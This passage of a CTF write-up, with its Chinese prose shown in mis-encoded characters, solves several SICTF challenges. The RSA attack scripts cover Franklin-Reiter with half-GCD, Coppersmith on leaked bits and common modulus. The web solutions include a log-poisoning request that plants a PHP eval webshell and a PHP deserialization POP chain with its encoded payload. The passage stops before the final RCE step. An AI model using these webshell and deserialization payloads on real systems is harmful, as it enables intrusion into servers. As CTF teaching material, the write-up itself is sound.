<p>è¿™æ˜¯å’Œæ™®é€šRSAä¸ä¸€æ ·çš„åœ°æ–¹ï¼Œå¯ä»¥è€ƒè™‘Franklin-Reiterç›¸å…³æ¶ˆæ¯æ”»å‡»ï¼Œä½†æ˜¯æœ¬é¢˜çš„eæ˜¯65537ï¼Œæ±‚gcdçš„æ—¶å€™ä¼šéå¸¸æ…¢ã€‚</p>
<p>æœäº†ä¸€ä¸‹ï¼Œæœ‰ä¸ªä¼˜åŒ–æ±‚gcdçš„ç®—æ³•å«Half-gcdï¼Œç”¨è¿™ä¸ªç®—æ³•ä¼˜åŒ–ä¸€ä¸‹Franklin-Reiterç›¸å…³æ¶ˆæ¯æ”»å‡»å³å¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">n = <span class="number">71451784354488078832557440841067139887532820867160946146462765529262021756492415597759437645000198746438846066445835108438656317936511838198860210224738728502558420706947533544863428802654736970469313030584334133519644746498781461927762736769115933249195917207059297145965502955615599481575507738939188415191</span></span><br><span class="line">c1 = <span class="number">60237305053182363686066000860755970543119549460585763366760183023969060529797821398451174145816154329258405143693872729068255155086734217883658806494371105889752598709446068159151166250635558774937924668506271624373871952982906459509904548833567117402267826477728367928385137857800256270428537882088110496684</span></span><br><span class="line">c2 = <span class="number">20563562448902136824882636468952895180253983449339226954738399163341332272571882209784996486250189912121870946577915881638415484043534161071782387358993712918678787398065688999810734189213904693514519594955522460151769479515323049821940285408228055771349670919587560952548876796252634104926367078177733076253</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">HGCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="number">2</span> * b.degree() &lt;= a.degree() <span class="keyword">or</span> a.degree() == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    m = a.degree() // <span class="number">2</span></span><br><span class="line">    a_top, a_bot = a.quo_rem(x^m)</span><br><span class="line">    b_top, b_bot = b.quo_rem(x^m)</span><br><span class="line">    R00, R01, R10, R11 = HGCD(a_top, b_top)</span><br><span class="line">    c = R00 * a + R01 * b</span><br><span class="line">    d = R10 * a + R11 * b</span><br><span class="line">    q, e = c.quo_rem(d)</span><br><span class="line">    d_top, d_bot = d.quo_rem(x^(m // <span class="number">2</span>))</span><br><span class="line">    e_top, e_bot = e.quo_rem(x^(m // <span class="number">2</span>))</span><br><span class="line">    S00, S01, S10, S11 = HGCD(d_top, e_top)</span><br><span class="line">    RET00 = S01 * R00 + (S00 - q * S01) * R10</span><br><span class="line">    RET01 = S01 * R01 + (S00 - q * S01) * R11</span><br><span class="line">    RET10 = S11 * R00 + (S10 - q * S11) * R10</span><br><span class="line">    RET11 = S11 * R01 + (S10 - q * S11) * R11</span><br><span class="line">    <span class="keyword">return</span> RET00, RET01, RET10, RET11</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GCD</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="built_in">print</span>(a.degree(), b.degree())</span><br><span class="line">    q, r = a.quo_rem(b)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    R00, R01, R10, R11 = HGCD(a, b)</span><br><span class="line">    c = R00 * a + R01 * b</span><br><span class="line">    d = R10 * a + R11 * b</span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> c.monic()</span><br><span class="line">    q, r = c.quo_rem(d)</span><br><span class="line">    <span class="keyword">if</span> r == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> GCD(d, r)</span><br><span class="line"></span><br><span class="line">P.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">sys.setrecursionlimit(<span class="number">500000</span>)</span><br><span class="line">f = (x)^e - c1</span><br><span class="line">g = (<span class="number">233</span>*x+<span class="number">9527</span>)^e - c2</span><br><span class="line">km = GCD(f,g)</span><br><span class="line">m = -km.monic()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>



<p>è·‘ä¸Šå‡ åˆ†é’Ÿå°±èƒ½å‡ºflag.</p>
<h4 id="é“œåŒ "><a href="#é“œåŒ " class="headerlink" title="é“œåŒ "></a>é“œåŒ </h4><p>$p$ é«˜ä½æ³„éœ²çš„å˜å½¢ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Decimal_conversion</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;0&#x27;</span></span><br><span class="line">    digits = []</span><br><span class="line">    <span class="keyword">while</span> num:</span><br><span class="line">        digits.append(<span class="built_in">str</span>(num % <span class="number">5</span>))</span><br><span class="line">        num //= <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">reversed</span>(digits))</span><br></pre></td></tr></table></figure>

<p>åˆ†æè¿™ä¸ªå‡½æ•°ï¼Œè¿™æ˜¯ä¸ªå°†åè¿›åˆ¶æ•°è½¬ä¸ºäº”è¿›åˆ¶æ•°çš„ä¸€ä¸ªå‡½æ•°ã€‚</p>
<p>é¢˜ç›®ä¸­å°† $p$ è½¬ä¸ºäº”è¿›åˆ¶ç„¶åå–äº†å‰112ä½ï¼Œè€ƒè™‘å…ˆå°† $leak$ è½¬æˆåè¿›åˆ¶ã€‚</p>
<p>ä¸€ä¸ª512bitçš„æ•°è½¬æˆ5è¿›åˆ¶å·®ä¸å¤šæ˜¯221ä½ï¼Œé‚£ä¹ˆå°† $leak$ è½¬ä¸ºåè¿›åˆ¶æ—¶å¯¹åº”ä½æƒå€¼åº”è¯¥ä» $5^{109}$ å¼€å§‹ï¼Œå¾—åˆ°10è¿›åˆ¶çš„ $leak$ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">leak = <span class="number">12170789707638469557363249767228204966074269830454332436369564884472290413677806300009225162224310724599340622124020450112169555723085068166255950927734375</span></span><br></pre></td></tr></table></figure>

<p> æ¥ä¸‹æ¥å°±æ˜¯å¸¸è§çš„ $p$ é«˜ä½æ³„éœ²ï¼Œè¿™é‡Œä½¿ç”¨coppersmithæ”»å‡»</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">leak = <span class="number">12170789707638469557363249767228204966074269830454332436369564884472290413677806300009225162224310724599340622124020450112169555723085068166255950927734375</span></span><br><span class="line">n = <span class="number">85988668134257353631742597258304937106964673395852009846703777410474172989069717247424903079500594820235304351355706519069516847244761609583338251489134035212061654870087550317540291994559481862615812258493738064606592165529948648774081655902831715928483206013332330998262897765489820121129058926463847702821</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">64708526479058278743788046708923650158905888858865427385501446781738669889375403360886995849554813207230509920789341593771929287415439407977283018525484281064769128358863513387658744063469874845446480637925790150835186431234289848506337341595817156444941964510251032210939739594241869190746437858135599624562</span></span><br><span class="line"></span><br><span class="line">leak = (leak &gt;&gt; <span class="number">256</span>)</span><br><span class="line">t = <span class="built_in">bin</span>(leak)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(t))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> tqdm.trange(<span class="number">2</span>^<span class="number">8</span>):</span><br><span class="line">    ph = (leak &lt;&lt; <span class="number">8</span>)</span><br><span class="line">    phigh = ph + i</span><br><span class="line">    phigh = (phigh &lt;&lt; <span class="number">248</span>)</span><br><span class="line">    <span class="comment">#print(ph)</span></span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f = phigh + x</span><br><span class="line">    res = f.small_roots(X=<span class="number">2</span>^<span class="number">248</span>, beta=<span class="number">0.4</span>, epsilon=<span class="number">0.01</span>)</span><br><span class="line">    <span class="keyword">if</span> res != []:</span><br><span class="line">        p = phigh + <span class="built_in">int</span>(res[<span class="number">0</span>])</span><br><span class="line">        q = n//p</span><br><span class="line">        phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">        d = libnum.invmod(e,phi)</span><br><span class="line">        m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">        flag = libnum.n2s(<span class="built_in">int</span>(m))</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        </span><br></pre></td></tr></table></figure>

<p>è¦è·‘æŒºä¹…çš„ï¼Œæœ€åå¾—åˆ°flag.</p>
<p><img src="/images/image-20240218182357441.png" alt="image-20240218182357441"></p>
<h4 id="SuperbRSA"><a href="#SuperbRSA" class="headerlink" title="SuperbRSA"></a>SuperbRSA</h4><p>ä¸€çœ¼çœ‹ä¸Šå»æ˜¯å…±æ¨¡æ”»å‡»ï¼Œä½†æ˜¯ $e1$ å’Œ $e2$ ä¸äº’ç´ ã€‚</p>
<p>è§£å†³æ–¹æ³•ä¹Ÿå¾ˆç®€å•ï¼Œå…ˆæ¨ä¸€ä¸‹å¼å­ã€‚</p>
<p>è®¾ $t&#x3D;gcd(e1,e2)$</p>
<p>æ ¹æ®å…±æ¨¡æ”»å‡»çš„åŸç†ï¼Œæœ‰ $c_1^{r}\times c_2^s \equiv m^t \mod n$</p>
<p>åˆ™ $m^t&#x3D;k\times n+c_1^{r}\times c_2^s$</p>
<p>çˆ†ç ´ $k$ å³å¯</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e1 = <span class="number">55</span></span><br><span class="line">e2 = <span class="number">200</span></span><br><span class="line">n = <span class="number">19006830358118902392432453595802675566730850352890246995920642811967821259388009049803513102750594524106471709641202019832682438027312468849299985832675191795417160553379580813410722359089872519372049229233732405993062464286888889084640878784209014165871696882564834896322508054231777967011195636564463806270998326936161449009988434249178477100127347406759932149010712091376183710135615375272671888541233275415737155953323133439644529709898791881795186775830217884663044495979067807418758455237701315019683802437323177125493076113419739827430282311018083976114158159925450746712064639569301925672742186294237113199023</span></span><br><span class="line">c1 = <span class="number">276245243658976720066605903875366763552720328374098965164676247771817997950424168480909517684516498439306387133611184795758628248588201187138612090081389226321683486308199743311842513053259894661221013008371261704678716150646764446208833447643781574516045641493770778735363586857160147826684394417412837449465273160781074676966630398315417741542529612480836572205781076576325382832502694868883931680720558621770570349864399879523171995953720198118660355479626037129047327185224203109006251809257919143284157354935005710902589809259500117996982503679601132486140677013625335552533104471327456798955341220640782369529</span></span><br><span class="line">c2 = <span class="number">11734019659226247713821792108026989060106712358397514827024912309860741729438494689480531875833287268454669859568719053896346471360750027952226633173559594064466850413737504267807599435679616522026241111887294138123201104718849744300769676961585732810579953221056338076885840743126397063074940281522137794340822594577352361616598702143477379145284687427705913831885493512616944504612474278405909277188118896882441812469679494459216431405139478548192152811441169176134750079073317011232934250365454908280676079801770043968006983848495835089055956722848080915898151352242215210071011331098761828031786300276771001839021</span></span><br><span class="line">r,s,tmp = libnum.xgcd(e1,e2)</span><br><span class="line">t = libnum.gcd(e1,e2)</span><br><span class="line"><span class="keyword">if</span> r&lt;<span class="number">0</span>:</span><br><span class="line">    r = -r</span><br><span class="line">    c1 = libnum.invmod(c1,n)</span><br><span class="line"><span class="keyword">if</span> s&lt;<span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    c2 = libnum.invmod(c2,n)</span><br><span class="line">res = (<span class="built_in">pow</span>(c1,r,n)*<span class="built_in">pow</span>(c2,s,n))%n</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    mt = res + k*n</span><br><span class="line">    m = libnum.nroot(mt,t)</span><br><span class="line">    flag = libnum.n2s(m)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&quot;SICTF&quot;</span> <span class="keyword">in</span> flag:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20240218183736118.png" alt="image-20240218183736118"></p>
<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h4 id="100ï¼…-upload"><a href="#100ï¼…-upload" class="headerlink" title="100ï¼…_upload"></a>100ï¼…_upload</h4><p><img src="/images/image-20240218200208405.png" alt="image-20240218200208405"></p>
<p>è¿›å…¥ç½‘ç«™ï¼Œå‘ç°ä¸€ä¸ªé€šè¿‡GETä¼ å…¥çš„fileå˜é‡ã€‚</p>
<p>å°è¯•è®¿é—®<code>http://yuanshen.life:38884/index.php?file=index.php</code></p>
<p>é¡µé¢æç¤ºä¸è¦è‡ªåŒ…å«</p>
<p><img src="/images/image-20240218200400211.png" alt="image-20240218200400211"></p>
<p>è¯´æ˜å­˜åœ¨<code>include($file)</code>è¿™æ ·çš„æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</p>
<p>å°è¯•ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œå‘ç°.htaccessç­‰ç±»å‹çš„æ–‡ä»¶éƒ½è¢«banæ‰äº†ï¼Œè¿™é‡Œè€ƒè™‘ä½¿ç”¨åŒ…å«æ—¥å¿—ã€‚</p>
<p>æˆ‘ä»¬å¯¹WebæœåŠ¡å™¨çš„HTTPè¯·æ±‚ï¼Œéƒ½ä¼šè¢«æœåŠ¡å™¨è®°å½•ä¸‹æ¥ï¼Œä¿å­˜åœ¨æœåŠ¡å™¨çš„æ—¥å¿—ä¸­ã€‚</p>
<p>ä¸€èˆ¬æ˜¯è¿™ä¸ªè·¯å¾„<code>/var/log/nginx/access.log</code></p>
<p>æˆ‘ä»¬åªéœ€è¦æ„é€ ä¸€å¥è¯æœ¨é©¬çš„GETè¯·æ±‚ï¼Œç„¶ååŒ…å«è¿™ä¸ªè·¯å¾„ä¸‹çš„æ—¥å¿—å³å¯ã€‚æ³¨æ„è¦ä½¿ç”¨BurpSuiteä¼ é©¬ï¼Œç”¨å…¶ä»–å·¥å…·ä¼šurlç¼–ç å¯¼è‡´ä¸èƒ½è§£æã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.php?file=upload.php&lt;?php @eval($_POST[&#x27;attack&#x27;]); ?&gt;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨èšå‰‘è¿æ¥ã€‚</p>
<p><img src="/images/image-20240218201205415.png" alt="image-20240218201205415"></p>
<p><img src="/images/image-20240218201233725.png" alt="image-20240218201233725"></p>
<p>å‘ç°flagåœ¨æ ¹ç›®å½•ï¼Œæ‰“å¼€å¾—åˆ°flagï¼šSICTF{7e951aad-7b6f-4a2a-abb8-8bf5e1cde6c4}</p>
<h4 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h4><p>ååºåˆ—åŒ–+RCE</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">begin0fweb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">begin0fweb</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$p</span>=<span class="string">&#x27;hacker!&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;welcome-&gt;you = <span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;  Welcome to new year!  &#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable language_">$this</span>-&gt;year);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/worries/i&#x27;</span>,<span class="variable">$this</span>-&gt;newyear))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;empty it!&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^.*(worries).*$/&#x27;</span>,<span class="variable">$this</span>-&gt;newyear)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Don\&#x27;t be worry&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Worries doesn\&#x27;t exists in the new year  &#x27;</span>;</span><br><span class="line">            <span class="keyword">empty</span>(<span class="variable language_">$this</span>-&gt;last-&gt;worries);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;get&#x27;</span>] <span class="keyword">as</span> <span class="variable">$inject</span> =&gt; <span class="variable">$rce</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;<span class="subst">&#123;$inject&#125;</span>=<span class="subst">&#123;$rce&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;echo \&quot;Haven&#x27;t you get the secret?\&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;go&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;go&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆçœ‹ä»£ç ï¼Œçªç ´å£åœ¨ETç±»ä¸­çš„<code>__isset()</code>é­”æœ¯æ–¹æ³•ã€‚</p>
<p>å¯ä»¥é€šè¿‡CRç±»ä¸­çš„empty()æ¥è§¦å‘<code>__isset()</code>é­”æœ¯æ–¹æ³•ï¼ŒSEç±»ä¸­æœ‰<code>echo()</code>ï¼Œå¯ä»¥é€šè¿‡è¿™ä¸ªæ¥è§¦å‘CRç±»ä¸­çš„<code>__toString()</code>é­”æœ¯æ–¹æ³•ã€‚</p>
<p>SEç±»çš„<code>__set</code>é€šè¿‡startç±»ä¸­çš„<code>$this-&gt;welcome-&gt;you = $p;</code>æ¥è§¦å‘ã€‚</p>
<p>æ€è·¯æœ‰äº†ï¼Œæ„é€ popé“¾ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">start</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$welcome</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$you</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SE</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$year</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CR</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$last</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$newyear</span>=<span class="string">&#x27;WORRIES&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ET</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = <span class="keyword">new</span> <span class="title function_ invoke__">start</span>();</span><br><span class="line"><span class="variable">$data</span>-&gt;welcome = <span class="keyword">new</span> <span class="title function_ invoke__">SE</span>();</span><br><span class="line"><span class="variable">$data</span>-&gt;welcome-&gt;year = <span class="keyword">new</span> <span class="title function_ invoke__">CR</span>();</span><br><span class="line"><span class="variable">$data</span>-&gt;welcome-&gt;year-&gt;last = <span class="keyword">new</span> <span class="title function_ invoke__">ET</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$data</span>));</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXT1JSSUVTIjt9fXM6MzoieW91IjtOO30=</span><br></pre></td></tr></table></figure>

<p>å…ˆæ£€éªŒä¸€ä¸‹æ­£ç¡®æ€§ï¼Œè®¿é—®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://yuanshen.life:38932/?go=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo3OiJXT1JSSUVTIjt9fXM6MzoieW91IjtOO30=</span><br></pre></td></tr></table></figure>

<p><img src="/images/image-20240218203155388.png" alt="image-20240218203155388"></p>
<p>è¯´æ˜æ„é€ æ­£ç¡®ã€‚</p>
<p>æ¥ä¸‹æ¥æ€è€ƒå¦‚ä½•æ‹¿åˆ°flagã€‚</p>
